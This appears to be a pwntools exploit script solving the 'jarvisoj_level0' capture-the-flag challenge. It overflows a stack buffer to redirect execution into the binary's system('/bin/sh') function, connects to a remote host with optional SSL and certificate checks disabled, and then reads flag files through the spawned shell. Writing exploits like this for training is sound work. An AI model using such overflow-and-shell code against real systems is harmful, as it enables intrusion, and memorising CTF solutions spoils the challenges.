from pwn import *
import os
import re
import ssl
import sys
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./jarvisoj_level0"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

# vulnerable_function: buffer @ rbp-0x80, saved RIP @ rbp+8
OFFSET = 0x80 + 8

# callsystem: push rbp; mov rbp,rsp; mov edi,"/bin/sh"; call system
# Entering at 0x400596 misaligns system(); skip push rbp.
CALLSYSTEM = 0x400596
TARGET = CALLSYSTEM + 1


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 06_jarvisoj_level0_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()

    payload = b"A" * OFFSET + p64(TARGET)
    log.info(f"payload={len(payload)} bytes, ret -> {hex(TARGET)}")
    p.sendline(payload)

    # read() may consume a command sent in the same packet; wait for the shell.
    time.sleep(0.3)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
